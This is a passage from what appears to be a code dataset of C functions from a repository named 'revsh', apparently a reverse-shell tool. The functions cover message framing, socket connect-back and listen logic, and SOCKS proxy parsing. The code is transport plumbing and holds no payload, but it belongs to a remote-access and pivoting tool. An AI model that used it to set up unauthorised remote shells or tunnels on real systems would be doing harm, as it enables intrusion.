tmp_proxy_node;\n\t\tio->proxy_tail = cur_proxy_node;\n\t}\n\n\tio->fd_count++;\n\treturn(cur_proxy_node);\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/***********************************************************************************************************************\n *\n * message_push()\n *\n * Input: Nothing, but we will heavily reference the global io_helper struct.\n * Output: 0 on success, -1 on error.\n *\n * Purpose: This is our message interface for sending data.\n *\n **********************************************************************************************************************/\n", "func_signal": "int message_push()", "code": "{\n\n\tunsigned short header_len;\n\tunsigned short tmp_short;\n\n\n\t/* Send the header. */\n\theader_len = sizeof(message->data_type) + sizeof(message->data_len);\n\n\tif(message->data_type == DT_PROXY || message->data_type == DT_CONNECTION){\n\t\theader_len += sizeof(message->header_type) + sizeof(message->header_origin) + sizeof(message->header_id);\n\t\tif(message->header_type == DT_PROXY_HT_CREATE || message->header_type == DT_PROXY_HT_REPORT || message->header_type == DT_CONNECTION_HT_CREATE){\n\t\t\theader_len += sizeof(message->header_proxy_type);\n\t\t}\n\t}\n\n\tif(header_len > io->message_data_size){\n\t\treport_error(\"message_push(): message: local header too long!\");\n\t\treturn(-1);\n\t}\n\n\ttmp_short = htons(header_len);\n\tif(io->remote_write(&tmp_short, sizeof(tmp_short)) == -1){\n\t\treport_error(\"message_push(): remote_write(%lx, %d): %s\", \\\n\t\t\t\t(unsigned long) &tmp_short, (int) sizeof(tmp_short), strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tif(io->remote_write(&message->data_type, sizeof(message->data_type)) == -1){\n\t\treport_error(\"message_push(): remote_write(%lx, %d): %s\", \\\n\t\t\t\t(unsigned long) &message->data_type, (int) sizeof(message->data_type), strerror(errno));\n\t\treturn(-1);\n\t}\t\n\n\tif(message->data_type == DT_NOP){\n\t\tmessage->data_len = 0;\n\t}\n\n\t/* Send the data. */\n\tif(message->data_len > io->message_data_size){\n\t\treport_error(\"message_push(): message: local data too long!\");\n\t\treturn(-1);\n\t}\n\n\ttmp_short = htons(message->data_len);\n\tif(io->remote_write(&tmp_short, sizeof(tmp_short)) == -1){\n\t\treport_error(\"message_push(): remote_write(%lx, %d): %s\", \\\n\t\t\t\t(unsigned long) &tmp_short, (int) sizeof(tmp_short), strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tif(message->data_type == DT_PROXY || message->data_type == DT_CONNECTION){\n\t\ttmp_short = htons(message->header_type);\n\t\tif(io->remote_write(&tmp_short, sizeof(tmp_short)) == -1){\n\t\t\treport_error(\"message_push(): remote_write(%lx, %d): %s\", \\\n\t\t\t\t\t(unsigned long) &tmp_short, (int) sizeof(tmp_short), strerror(errno));\n\t\t\treturn(-1);\n\t\t}\n\n\t\ttmp_short = htons(message->header_origin);\n\t\tif(io->remote_write(&tmp_short, sizeof(tmp_short)) == -1){\n\t\t\treport_error(\"message_push(): remote_write(%lx, %d): %s\", \\\n\t\t\t\t\t(unsigned long) &tmp_short, (int) sizeof(tmp_short), strerror(errno));\n\t\t\treturn(-1);\n\t\t}\n\n\t\ttmp_short = htons(message->header_id);\n\t\tif(io->remote_write(&tmp_short, sizeof(tmp_short)) == -1){\n\t\t\treport_error(\"message_push(): remote_write(%lx, %d): %s\", \\\n\t\t\t\t\t(unsigned long) &tmp_short, (int) sizeof(tmp_short), strerror(errno));\n\t\t\treturn(-1);\n\t\t}\n\n\t\tif(message->header_type == DT_PROXY_HT_CREATE || message->header_type == DT_PROXY_HT_REPORT || message->header_type == DT_CONNECTION_HT_CREATE){\n\t\t\ttmp_short = htons(message->header_proxy_type);\n\t\t\tif(io->remote_write(&tmp_short, sizeof(tmp_short)) == -1){\n\t\t\t\treport_error(\"message_push(): remote_write(%lx, %d): %s\", \\\n\t\t\t\t\t\t(unsigned long) &tmp_short, (int) sizeof(tmp_short), strerror(errno));\n\t\t\t\treturn(-1);\n\t\t\t}\n\t\t}\n\t}\n\n\tif(io->remote_write(message->data, message->data_len) == -1){\n\t\treport_error(\"message_push(): remote_write(%lx, %d): %s\", \\\n\t\t\t\t(unsigned long) message->data, message->data_len, strerror(errno));\n\t\treturn(-1);\n\t}\n\n\treturn(0);\n}", "path": "message.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/***********************************************************************************************************************\n *\n * init_io_target()\n *\n * Input: None. We will use the global io and config structs.\n * Output: An int showing success (by returning the remote_fd) or failure (by returning -1).\n *\n * Purpose: To initialize a target's network io layer.\n *\n **********************************************************************************************************************/\n", "func_signal": "int init_io_target()", "code": "{\n\n\tint retval;\n\n\tstruct sockaddr_in name;\n\tstruct hostent *host;\n\n\tchar *ip_address;\n\tchar *ip_port;\n\tint ip_address_len;\n\n\tint tmp_sock;\n\n\tstruct sigaction act;\n\n\n\t/* In the no ssl build, there is no difference between a target in bindshell mode, and the control node for networking. */\n\t/* As such, we'll just pass through to the other rather than repeat code. */\n\tif(io->target && config->bindshell){\n\t\treturn(init_io_control(config));\n\t}\n\n\t/* Initialize the structures we will need. */\n\n\t/* Open our socket. */\n\tip_address_len = strlen(config->ip_addr);\n\tif((ip_address = calloc(ip_address_len + 1, sizeof(char))) == NULL){\n\t\treport_error(\"init_io_target(): calloc(%d, %d): %s\", ip_address_len, (int) sizeof(char), strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tmemcpy(ip_address, config->ip_addr, ip_address_len);\n\n\n\tif((ip_port = strchr(ip_address, ':')) == NULL){\n\t\treport_error(\"init_io_target(): strchr(%s, ':'): Port not found!\", ip_address);\n\t\treturn(-1);\n\t}\n\t*ip_port = '\\0';\n\tip_port++;\n\n\tif((host = gethostbyname(ip_address)) == NULL){\n\t\treport_error(\"init_io_target(): gethostbyname(%s): %s\", ip_address, strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tmemset(&name, 0, sizeof(name));\n\tname.sin_family = AF_INET;\n\tname.sin_port = htons(strtol(ip_port, NULL, 10));\n\n\tfree(ip_address);\n\n\tif((tmp_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){\n\t\treport_error(\"init_io_target(): socket(AF_INET, SOCK_STREAM, 0): %s\", strerror(errno));\n\t\treturn(-1);\n\t}\n\n\t/* Sepuku if left alone too long. */\n\tmemset(&act, 0, sizeof(act));\n\tact.sa_handler = seppuku;\n\n\tif(sigaction(SIGALRM, &act, NULL) == -1){\n\t\treport_error(\"init_io_target(): sigaction(%d, %lx, %p): %s\", SIGALRM, (unsigned long) &act, NULL, strerror(errno));\n\t\treturn(-1);\n\t}\n\n\talarm(config->timeout);\n\n\tif(verbose){\n\t\tprintf(\"Connecting to %s...\", config->ip_addr);\n\t\tfflush(stdout);\n\t}\n\n\twhile((retval = connect(tmp_sock, (struct sockaddr *) &name, sizeof(name)))){\n\n\t\tif(retval == -1){\n\t\t\treport_error(\"init_io_target(): connect(%d, %lx, %d): %s\", io->remote_fd, (unsigned long) &name, (int) sizeof(name), strerror(errno));\n\t\t\tif((errno == ECONNREFUSED || errno == ETIMEDOUT)){\n\t\t\t\treturn(-2);\n\t\t\t}\n\t\t\treturn(-1);\n\t\t}\n\n\t\tif(verbose){\n\t\t\tprintf(\"Connecting to %s...\", config->ip_addr);\n\t\t\tfflush(stdout);\n\t\t}\n\t}\n\n\tio->remote_fd = tmp_sock;\n\n\tact.sa_handler = SIG_DFL;\n\n\tif(sigaction(SIGALRM, &act, NULL) == -1){\n\t\treport_error(\"init_io_target(): sigaction(%d, %lx, %p): %s\", SIGALRM, (unsigned long) &act, NULL, strerror(errno));\n\t\treturn(-1);\n\t}\n\n\talarm(0);\n\n\tif(verbose){\n\t\tprintf(\"\\tConnected!\\n\");\n\t}\n\n\treturn(io->remote_fd);\n}", "path": "io_nossl.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/***********************************************************************************************************************\n *\n * message_helper_destroy()\n *\n * Input:  The message_helper node that we want to destroy.\n * Output: None.\n *\n * Purpose: Destroy a message_helper node.\n *\n **********************************************************************************************************************/\n", "func_signal": "void message_helper_destroy(struct message_helper *mh)", "code": "{\n\tfree(mh->data);\n\tfree(mh);\n}", "path": "message.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * connection_node_delete()\n *\n * Inputs: A pointer to the connection_node we wish to destroy.\n *\n * Outputs: None.\n *\n * Purpose: Destroy a connection node and remove it froms the linked list.\n *\n ******************************************************************************/\n", "func_signal": "void connection_node_delete(struct connection_node *cur_connection_node)", "code": "{\n\n\tif(cur_connection_node == io->connection_head){\n\t\tio->connection_head = cur_connection_node->next;\n\t}\n\tif(cur_connection_node == io->connection_tail){\n\t\tio->connection_tail = cur_connection_node->prev;\n\t}\n\tif(cur_connection_node->prev){\n\t\tcur_connection_node->prev->next = cur_connection_node->next;\n\t}\n\tif(cur_connection_node->next){\n\t\tcur_connection_node->next->prev = cur_connection_node->prev;\n\t}\n\n\tif(cur_connection_node->fd){\n\t\tclose(cur_connection_node->fd);\n\t}\n\tif(cur_connection_node->rhost_rport){\n\t\tfree(cur_connection_node->rhost_rport);\n\t}\n\tif(cur_connection_node->buffer_head){\n\t\tfree(cur_connection_node->buffer_head);\n\t}\n\tif(cur_connection_node){\n\t\tfree(cur_connection_node);\n\t}\n\n\tio->fd_count--;\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/***********************************************************************************************************************\n *\n * remote_read_plaintext()\n *\n * Input: A pointer to the buffer we want to fill, and the count of characters we need to read. \n *   We will also use the the global io struct.\n * Output: The count of characters succesfully read, or -1 on error.\n *\n * Purpose: Fill our buffer.\n *\n **********************************************************************************************************************/\n", "func_signal": "int remote_read_plaintext(void *buff, size_t count)", "code": "{\n\n\tint retval;\n\tint io_bytes;\n\tchar *tmp_ptr;\n\n\tfd_set fd_select;\n\n\tint seen = 0;\n\n\n\tio_bytes = 0;\n\ttmp_ptr = buff;\n\n\twhile(count){\n\n\t\t/* Skip the select() statement the first time through, as the common case won't need it. */\n\t\tif(seen){\n\t\t\tFD_ZERO(&fd_select);\n\t\t\tFD_SET(io->remote_fd, &fd_select);\n\n\t\t\tif(select(io->remote_fd + 1, &fd_select, NULL, NULL, NULL) == -1){\n\t\t\t\treport_error(\"remote_read_plaintext(): select(%d, %lx, NULL, NULL, NULL): %s\", \\\n\t\t\t\t\t\tio->remote_fd + 1, (unsigned long) &fd_select, strerror(errno));\n\t\t\t\treturn(-1);\n\t\t\t}\n\t\t}else{\n\t\t\tseen = 1;\n\t\t}\n\n\t\tretval = read(io->remote_fd, tmp_ptr, count);\n\n\t\tif(!retval){\n\t\t\tio->eof = 1;\n\t\t\treturn(-1);\n\n\t\t}else if(retval == -1){\n\t\t\tif(!(errno == EINTR  || errno == EAGAIN)){\n\t\t\t\treport_error(\"remote_read_plaintext(): read(%d, %lx, %d): %s\", \\\n\t\t\t\t\t\tio->remote_fd, (unsigned long) &tmp_ptr, (int) count, strerror(errno));\n\t\t\t\treturn(-1);\n\t\t\t}\n\n\t\t}else{\n\t\t\tcount -= retval;\n\t\t\tio_bytes += retval;\n\t\t\ttmp_ptr += retval;\n\t\t}\n\t}\n\n\treturn(io_bytes);\n}", "path": "io_nossl.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * parse_socks_request()\n *\n * Inputs: The pointer to the connection node that represents a socks proxy\n *         connection in its opening phase.\n *\n * Outputs: The current state of the socks request. -1 on error.\n *\n * Purpose: Socks requests involve a handshake. This is the function that \n *          parses that handshake.\n *\n ******************************************************************************/\n", "func_signal": "int parse_socks_request(struct connection_node *cur_connection_node)", "code": "{\n\n\tint index, size;\n\tint nmethods, i;\n\tint len = 0;\n\n\tchar *domain_name;\n\tchar *head;\n\tchar *dst_port_ptr = NULL;\n\tchar *dst_addr_ptr = NULL;\n\n\tint atype = 0x01;\n\tint noauth_found;\n\n\n\thead = cur_connection_node->buffer_ptr;\n\tsize = cur_connection_node->buffer_tail - cur_connection_node->buffer_ptr;\n\tindex = 0;\n\n\tif(!size){\n\t\treturn(CON_SOCKS_INIT);\n\t}\n\n\t// Socks 4 or 4a.\n\tif(head[index] == 4){\n\n\t\t/*\n\t\t * +----+----+----+----+----+----+----+----+----+----+....+----+\n\t\t * | VN | CD | DSTPORT |      DSTIP        | USERID       |NULL|\n\t\t * +----+----+----+----+----+----+----+----+----+----+....+----+\n\t\t *  1    1    2         4                   variable       1\n\t\t *\n\t\t *  1 + 1 + 2 + 4 + 1 \n\t\t *  = 9  Minimum number of bytes to ensure we have at least 1 char of USERID.\n\t\t */\n\n\t\tif(size < 9){\n\t\t\treturn(CON_SOCKS_INIT);\n\t\t}\n\n\t\tindex += 1;\n\n\t\t// Only TCP Connect is supported.\n\t\tif(head[index] != 1){\n\t\t\treport_error(\"parse_socks_request(): Socks 4: Unsupported CD. Only CD \\\"Connect\\\" is supported.\");\n\t\t\treturn(-1);\n\t\t} \n\t\tindex += 1;\n\n\t\tdst_port_ptr = head + index;\n\t\tindex += 2;\n\n\t\tdst_addr_ptr = head + index;\n\t\tindex += 4;\n\n\t\t// We don't accept connections with a USERID field.\n\t\tif(head[index]){\n\t\t\treport_error(\"parse_socks_request(): Socks 4: USERID found, but not supported by this implementation.\");\n\t\t\treturn(-1);\n\t\t}\n\n\t\t// Socks 4a. Lets step through and grab the \"domain\".\n\t\t// Note: In the modern era, most clients use socks 4a. Even if the request is a normal ipv4\n\t\t// address and socks 4 would work fine... instead, they use socks 4a and send the ipv4 address\n\t\t// represented as a string. So here the \"domain\" may be something we pass to dns to resolve.\n\t\t// It *might* just be an ascii string representation of an ip address (v4 or v6).\n\t\tindex++;\n\t\tif( \\\n\t\t\t\t!dst_addr_ptr[0] && \\\n\t\t\t\t!dst_addr_ptr[1] && \\\n\t\t\t\t!dst_addr_ptr[2] && \\\n\t\t\t\tdst_addr_ptr[3] \\\n\t\t\t){\n\n\t\t\tif(!(index < size)){\n\t\t\t\treturn(CON_SOCKS_INIT);\n\t\t\t}\n\n\t\t\tdomain_name = head + index;\n\t\t\twhile(head[index]){\n\t\t\t\tindex++;\n\t\t\t\tif(index == size){\n\t\t\t\t\treturn(CON_SOCKS_INIT);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tatype = 0x03;\n\t\t\tif((cur_connection_node->rhost_rport = addr_to_string(atype, domain_name, dst_port_ptr, strlen(domain_name))) == NULL){\n\t\t\t\treport_error(\"parse_socks_request(): addr_to_string(%d, %lx, %lx, %d): %s\", \\\n\t\t\t\t\t\tatype, (unsigned long) dst_addr_ptr, (unsigned long) dst_port_ptr, (int) strlen(domain_name), strerror(errno));\n\t\t\t\treturn(-1);\n\t\t\t}\n\n\t\t\tindex++;\n\t\t\tcur_connection_node->buffer_ptr = head + index;\n\n\t\t\treturn(CON_ACTIVE);\n\t\t}\n\n\t\tif((cur_connection_node->rhost_rport = addr_to_string(atype, dst_addr_ptr, dst_port_ptr, 0)) == NULL){\n\t\t\treport_error(\"parse_socks_request(): addr_to_string(%d, %lx, %lx, 0): %s\", \\\n\t\t\t\t\tatype, (unsigned long) dst_addr_ptr, (unsigned long) dst_port_ptr, strerror(errno));\n\t\t\treturn(-1);\n\t\t}\n\n\t\tcur_connection_node->buffer_ptr = head + index;\n\n\t\treturn(CON_ACTIVE);\n\n\t\t// SOCKS 5\n\t}else if(head[index] == 5){\n\n\t\tif(cur_connection_node->state == CON_SOCKS_INIT){\n\t\t\tindex += 1;\n\t\t\tif(!(index < size)){\n\t\t\t\treturn(CON_SOCKS_INIT);\n\t\t\t}\n\n\t\t\tnoauth_found = 0;\n\t\t\tnmethods = head[index++];\n\t\t\tfor(i = 0; i < nmethods; i++){\n\n\t\t\t\tif(!(index < size)){\n\t\t\t\t\treturn(CON_SOCKS_INIT);\n\t\t\t\t}\n\n\t\t\t\t// Someday we might implement more than the \"NO AUTHENTICATION REQUIRED\" method...\n\t\t\t\tif(head[index] == 0x00){\n\t\t\t\t\tnoauth_found = 1;\n\t\t\t\t}\n\n\t\t\t\tindex++;\n\t\t\t}\n\n\t\t\tcur_connection_node->buffer_ptr = head + index;\n\t\t\tif(noauth_found){\n\t\t\t\treturn(CON_SOCKS_V5_AUTH);\n\t\t\t}else{\n\t\t\t\treport_error(\"parse_socks_request(): Socks 5: No supported auth type found. Only \\\"No Authentication Required\\\" is supported.\");\n\t\t\t\treturn(-1);\n\t\t\t}\n\n\t\t}else if(cur_connection_node->state == CON_SOCKS_V5_AUTH){\n\n\t\t\t/*\n\t\t\t * +----+-----+-------+------+----------+----------+\n\t\t\t * |VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |\n\t\t\t * +----+-----+-------+------+----------+----------+\n\t\t\t * | 1  |  1  | X'00' |  1   | Variable |    2     |\n\t\t\t * +----+-----+-------+------+----------+----------+\n\t\t\t *  (First byte of \"Variable\" is the strlen of the string that follows in the DOMAINNAME case. No '\\0' terminator.)\n\t\t\t *\n\t\t\t *  1 + 1 + 1 + 1 + 1 + V + 2\n\t\t\t *  = 7 + V...  So 7 is the minimum number of bytes before we can do anything interesting.\n\t\t\t */\n\n\t\t\tif(size < 7){\n\t\t\t\treturn(CON_SOCKS_INIT);\n\t\t\t}\n\n\t\t\tindex += 1;\n\n\t\t\tif(head[index] != 1){\n\t\t\t\treport_error(\"parse_socks_request(): Socks 5: Unsupported CMD. Only CMD \\\"Connect\\\" is supported.\");\n\t\t\t\treturn(-1);\n\t\t\t}\n\t\t\tindex += 2;\n\n\t\t\tatype = head[index];\n\t\t\tindex += 1;\n\n\t\t\tif(atype == 0x01){\n\t\t\t\tlen = 4;\n\t\t\t\t// From the diagram above. 4 + Variable + 2, where Variable is 4 in the ipv4 case.\n\t\t\t\tif(size < (4 + len + 2)){\n\t\t\t\t\treturn(CON_SOCKS_INIT);\n\t\t\t\t}\n\n\t\t\t\tdst_addr_ptr = head + index;\n\t\t\t\tindex += len;\n\t\t\t\tdst_port_ptr = head + index;\n\n\t\t\t}else if(atype == 0x03){\n\t\t\t\tlen = head[index];\n\n\t\t\t\t// From the diagram above. 4 + Variable + 2, where Variable length is defined in the first octet.\n\t\t\t\tif(size < (4 + 1 + len + 2)){\n\t\t\t\t\treturn(CON_SOCKS_INIT);\n\t\t\t\t}\n\n\t\t\t\tindex++;  // Move past the length variable.\n\t\t\t\tdst_addr_ptr = head + index;\n\t\t\t\tindex += len;\n\t\t\t\tdst_port_ptr = head + index;\n\n\t\t\t}else if(atype == 0x04){\n\t\t\t\tlen = 16;\n\n\t\t\t\t// From the diagram above. 4 + Variable + 2, where Variable is 16 in the ipv6 case.\n\t\t\t\tif(size < (4 + len + 2)){\n\t\t\t\t\treturn(CON_SOCKS_INIT);\n\t\t\t\t}\n\n\t\t\t\tdst_addr_ptr = head + index;\n\t\t\t\tindex += len;\n\t\t\t\tdst_port_ptr = head + index;\n\n\t\t\t}else{\n\t\t\t\treport_error(\"parse_socks_request(): atype 0x%02x unknown.\", atype);\n\t\t\t\treturn(-1);\n\t\t\t}\n\n\t\t\tindex += 2;\n\n\n\t\t\tif((cur_connection_node->rhost_rport = addr_to_string(atype, dst_addr_ptr, dst_port_ptr, len)) == NULL){\n\t\t\t\treport_error(\"parse_socks_request(): addr_to_string(%d, %lx, %lx, 0): %s\", \\\n\t\t\t\t\t\tatype, (unsigned long) dst_addr_ptr, (unsigned long) dst_port_ptr, strerror(errno));\n\t\t\t\treturn(-1);\n\t\t\t}\n\n\t\t\tcur_connection_node->buffer_ptr = head + index;\n\n\t\t\treturn(CON_ACTIVE);\n\t\t}\n\t}\n\n\treturn(-1);\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * proxy_node_find()\n *\n * Inputs: The tuple of (origin, id) that represents the unique id of a proxy.\n *\n * Outputs: The pointer to the matching proxy_node.\n *\n * Purpose: Find the matching proxy_node.\n *\n ******************************************************************************/\n", "func_signal": "struct proxy_node *proxy_node_find(unsigned short origin, unsigned short id)", "code": "{\n\tstruct proxy_node *tmp_proxy_node;\n\n\ttmp_proxy_node = io->proxy_head;\n\twhile(tmp_proxy_node){\n\t\tif((tmp_proxy_node->origin == origin) && (tmp_proxy_node->id == id)){\n\t\t\treturn(tmp_proxy_node);\n\t\t}\n\t\ttmp_proxy_node = tmp_proxy_node->next;\n\t}\n\treturn(NULL);\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/***********************************************************************************************************************\n *\n * init_io_control()\n *\n * Input: None. We will use the global io and config structs.\n * Output: An int showing success (by returning the remote_fd) or failure (by returning -1).\n *\n * Purpose: To initialize the control nodes network io layer.\n *\n **********************************************************************************************************************/\n", "func_signal": "int init_io_control()", "code": "{\n\n\tint tmp_sock;\n\n\tint yes = 1;\n\n\tstruct sockaddr_in name;\n\tstruct hostent *host;\n\n\tchar *ip_address;\n\tchar *ip_port;\n\tint ip_address_len;\n\n\tstruct sigaction act;\n\n\tsocklen_t len;\n\tstruct sockaddr_storage addr;\n\tchar ipstr[INET6_ADDRSTRLEN];\n\tint port;\n\tstruct sockaddr_in *s;\n\tstruct sockaddr_in6 *s6;\n\n\n\t/* In the no ssl build, there is no difference between a control in bindshell mode, and a target. */\n\t/* As such, we'll just pass through to the other rather than repeat code. */\n\tif(!io->target && config->bindshell){\n\t\treturn(init_io_target(config));\n\t}\n\n\t/* Initialize the structures we will be using. */\n\n\t/* Set up our socket. */\n\tip_address_len = strlen(config->ip_addr);\n\tif((ip_address = calloc(ip_address_len + 1, sizeof(char))) == NULL){\n\t\treport_error(\"init_io_control(): calloc(%d, %d): %s\", ip_address_len, (int) sizeof(char), strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tmemcpy(ip_address, config->ip_addr, ip_address_len);\n\n\tif((ip_port = strchr(ip_address, ':')) == NULL){\n\t\treport_error(\"init_io_control(): strchr(%s, ':'): Port not found!\", ip_address);\n\t\treturn(-1);\n\t}\n\t*ip_port = '\\0';\n\tip_port++;\n\n\tif((host = gethostbyname(ip_address)) == NULL){\n\t\treport_error(\"init_io_control(): gethostbyname(%s): %s\", ip_address, strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tmemset(&name, 0, sizeof(name));\n\tname.sin_family = AF_INET;\n\tname.sin_port = htons(strtol(ip_port, NULL, 10));\n\n\tfree(ip_address);\n\n\tif((tmp_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){\n\t\treport_error(\"init_io_control(): socket(AF_INET, SOCK_STREAM, 0): %s\", strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tif(setsockopt(tmp_sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) == -1){\n\t\treport_error(\"init_io_control(): setsockopt(%d, SOL_SOCKET, SO_REUSEADDR, %lx, %d): %s\", \\\n\t\t\t\ttmp_sock, (unsigned long) &yes, (int) sizeof(yes), strerror(errno));\n\t\treturn(-1);\n\t}\n\n\t/* Seppuku if left alone too long. */\n\tmemset(&act, 0, sizeof(act));\n\tact.sa_handler = seppuku;\n\n\tif(sigaction(SIGALRM, &act, NULL) == -1){\n\t\treport_error(\"init_io_control(): sigaction(%d, %lx, %p): %s\", SIGALRM, (unsigned long) &act, NULL, strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tif(verbose){\n\t\tprintf(\"Listening on %s...\", config->ip_addr);\n\t\tfflush(stdout);\n\t}\n\treport_log(\"Controller: Listening on %s.\", config->ip_addr);\n\n\tif(bind(tmp_sock, (struct sockaddr *) &name, sizeof(name)) == -1){\n\t\treport_error(\"init_io_control(): bind(%d, %lx, %d): %s\", \\\n\t\t\t\ttmp_sock, (unsigned long) &name, (int) sizeof(name), strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tif(listen(tmp_sock, 1) == -1){\n\t\treport_error(\"init_io_control(): listen(%d, 1): %s\", tmp_sock, strerror(errno));\n\t\treturn(-1);\n\t}  \n\n\tif((io->remote_fd = accept(tmp_sock, NULL, NULL)) == -1){\n\t\treport_error(\"init_io_control(): accept(%d, NULL, NULL): %s\", tmp_sock, strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tif(close(tmp_sock) == -1){\n\t\treport_error(\"init_io_control(): close(%d): %s\", tmp_sock, strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tlen = sizeof addr;\n\tif(getpeername(io->remote_fd, (struct sockaddr*) &addr, &len) == -1){\n\t\treport_error(\"init_io_control(): getpeername(%d, %lx, %lx): %s\", io->remote_fd, (unsigned long) &addr, &len, strerror(errno));\n\t}\n\n\tif(addr.ss_family == AF_INET){\n\t\ts = (struct sockaddr_in *) &addr;\n\t\tport = ntohs(s->sin_port);\n\t\tinet_ntop(AF_INET, &s->sin_addr, ipstr, sizeof ipstr);\n\t}else{\n\t\ts6 = (struct sockaddr_in6 *) &addr;\n\t\tport = ntohs(s6->sin6_port);\n\t\tinet_ntop(AF_INET6, &s6->sin6_addr, ipstr, sizeof ipstr);\n\t}\n\n\treport_log(\"Controller: Connected from %s:%d.\", ipstr, port);\n\n\treturn(io->remote_fd);\n}", "path": "io_nossl.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * proxy_listen()\n *\n * Inputs: A pointer to a proxy_node that we want to activate.\n *\n * Outputs: 0 on success, -1 otherwise.\n *\n * Purpose: Setup a new proxy listener.\n *\n ******************************************************************************/\n", "func_signal": "int proxy_listen(struct proxy_node *cur_proxy_node)", "code": "{\n\n\tint yes = 1;\n\tint rv, listener;\n\tstruct addrinfo hints, *ai, *p;\n\n\tmemset(&hints, 0, sizeof(hints));\n\n\thints.ai_family = AF_UNSPEC;\n\thints.ai_socktype = SOCK_STREAM;\n\thints.ai_flags = AI_PASSIVE;\n\n\tif((rv = getaddrinfo(cur_proxy_node->lhost, cur_proxy_node->lport, &hints, &ai)) != 0) {\n\t\treport_error(\"proxy_listen(): getaddrinfo(%s, %s, %lx, %lx): %s\", \\\n\t\t\t\tcur_proxy_node->lhost, cur_proxy_node->lport, (unsigned long) &hints, (unsigned long) &ai, gai_strerror(rv));\n\t\treturn(-1);\n\t}\n\n\tfor(p = ai; p != NULL; p = p->ai_next) {\n\t\tlistener = socket(p->ai_family, p->ai_socktype, p->ai_protocol);\n\t\tif (listener < 0) { \n\t\t\tcontinue;\n\t\t}\n\n\t\tsetsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));\n\n\t\tif(bind(listener, p->ai_addr, p->ai_addrlen) < 0){\n\t\t\tclose(listener);\n\t\t\tcontinue;\n\t\t}\n\n\t\tbreak;\n\t}\n\n\tif(p == NULL){\n\t\treport_error(\"proxy_listen(): Failed to bind() to %s:%s\", cur_proxy_node->lhost, cur_proxy_node->lport);\n\t\treturn(-1);\n\t}\n\tfreeaddrinfo(ai); \n\n\tif(listen(listener, 10) == -1) {\n\t\treport_error(\"proxy_listen(): listen(%d, 10): %s\", listener, strerror(errno));\n\t\treturn(-1);\n\t}\n\n\tfcntl(listener, F_SETFL, O_NONBLOCK);\n\tcur_proxy_node->fd = listener;\n\n\treturn(0);\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/******************************************************************************\n *\n * connection_node_find()\n *\n * Inputs: The tuple of (origin, id) that represents the unique id of a connection.\n *\n * Outputs: The pointer to the matching connection_node.\n *\n * Purpose: Find the matching connection_node.\n *\n ******************************************************************************/\n", "func_signal": "struct connection_node *connection_node_find(unsigned short origin, unsigned short id)", "code": "{\n\tstruct connection_node *tmp_connection_node;\n\n\ttmp_connection_node = io->connection_head;\n\twhile(tmp_connection_node){\n\t\tif((tmp_connection_node->origin == origin) && (tmp_connection_node->id == id)){\n\t\t\treturn(tmp_connection_node);\n\t\t}\n\t\ttmp_connection_node = tmp_connection_node->next;\n\t}\n\treturn(NULL);\n}", "path": "proxy.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/***********************************************************************************************************************\n *\n * message_pull()\n *\n * Input: Nothing, but we will heavily reference the global io_helper struct.\n * Output: 0 on success, -1 on error.\n *\n * Purpose: This is our message interface for receiving data.\n *\n **********************************************************************************************************************/\n", "func_signal": "int message_pull()", "code": "{\n\n\tunsigned short header_len;\n\tint retval;\n\n\n\tmemset(message->data, '\\0', io->message_data_size);\n\n\t/* Grab the header. */\n\tif((retval = io->remote_read(&header_len, sizeof(header_len))) == -1){\n\n\t\t/* During a normal disconnect condition, this is where the message_pull should fail, so check for EOF. */\n\t\tif(!io->eof){\n\t\t\treport_error(\"message_pull(): remote_read(%lx, %d): %s\", (unsigned long) &header_len, (int) sizeof(header_len), strerror(errno));\n\t\t}\n\t\treturn(-1);\n\t}\n\theader_len = ntohs(header_len);\n\n\tif((retval = io->remote_read(&message->data_type, sizeof(message->data_type))) == -1){\n\t\treport_error(\"message_pull(): remote_read(%lx, %d): %s\", \\\n\t\t\t\t(unsigned long) &message->data_type, (int) sizeof(message->data_type), strerror(errno));\n\t\treturn(-1);\n\t}\t\n\theader_len -= sizeof(message->data_type);\n\n\tif((retval = io->remote_read(&message->data_len, sizeof(message->data_len))) == -1){\n\t\treport_error(\"message_pull(): remote_read(%lx, %d): %s\", (unsigned long) &message->data_len, (int) sizeof(message->data_len), strerror(errno));\n\t\treturn(-1);\n\t}\t\n\tmessage->data_len = ntohs(message->data_len);\n\theader_len -= 